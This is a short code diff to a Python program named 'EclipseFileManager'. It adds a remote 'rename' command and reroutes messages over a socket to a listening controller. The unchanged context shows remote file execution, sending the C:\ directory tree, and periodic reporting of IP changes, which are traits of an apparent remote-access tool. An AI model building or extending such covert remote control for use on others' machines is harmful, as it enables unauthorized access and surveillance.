@@ -180,7 +180,7 @@ class Modules(Util):
             newname = os.path.dirname(path) + '\\' + newname
             os.rename(path, newname)
         else:
-            print(f'{path}   does not exist')
+            this.send(f'{path} does not exist')
 
     def update(this):
         this.sendTree('C:\\')
@@ -212,7 +212,7 @@ class EclipseFileManager():
             # Get the current IP address
             current_ip = socket.gethostbyname(socket.gethostname())
             if current_ip != prev_ip:
-                this.modules.send("IP address has changed from {prev_ip} to {current_ip}")
+                this.modules.send(f"IP address has changed from {prev_ip} to {current_ip}")
                 prev_ip = current_ip
             time.sleep(60)
 
@@ -239,6 +239,8 @@ class EclipseFileManager():
             this.modules.remoteExecute(path)
         elif data[0] == 'update':
             this.modules.update()
+        elif data[0] == 'rename':
+            this.modules.rename(data[1], data[2])
 
     def listen(this):
         this.server_socket.listen(1)
